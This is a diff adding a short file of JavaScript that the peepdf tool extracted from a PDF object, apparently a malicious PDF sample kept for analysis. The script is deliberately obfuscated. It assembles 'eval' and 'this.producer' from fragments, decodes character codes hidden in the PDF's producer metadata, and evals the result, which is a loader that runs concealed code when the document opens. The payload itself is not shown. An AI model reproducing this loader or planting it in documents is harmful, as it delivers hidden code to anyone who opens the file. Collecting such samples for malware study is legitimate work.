@@ -1,0 +1,25 @@
+// peepdf comment: Javascript code located in object 1 (version 0)
+
+<< /Names [() <</S /JavaScript
+/JS (
+var RijivoOki='';
+VevEda = new Date(2010,11,3,2);
+var SyvkiNisyh = function(){return {e:'eva'}}().e;
+PuaSolaqiw=eval(SyvkiNisyh+'l');
+CfoMhexuriifes = 'thi'+VevEda.getHours()+'ducer';
+LiwaveFir=PuaSolaqiw(CfoMhexuriifes.replace(2,'s.pro'));
+COmy = LiwaveFir.split('s');
+var TojamugukumYxiwup = '';
+g = VevEda.getHours();
+var aAd = 'fro'+VevEda.getHours()+'arCode';
+aAd=aAd.replace(2,'mCh');
+SruhusapiPuh=String[aAd];
+for (NafOci = 0; NafOci < COmy.length; NafOci++) {
+	XebawsOdja = PuaSolaqiw(COmy[NafOci]);
+	TojamugukumYxiwup += SruhusapiPuh(XebawsOdja);
+}
+PuaSolaqiw(TojamugukumYxiwup);
+)
+>>]
+>>
+
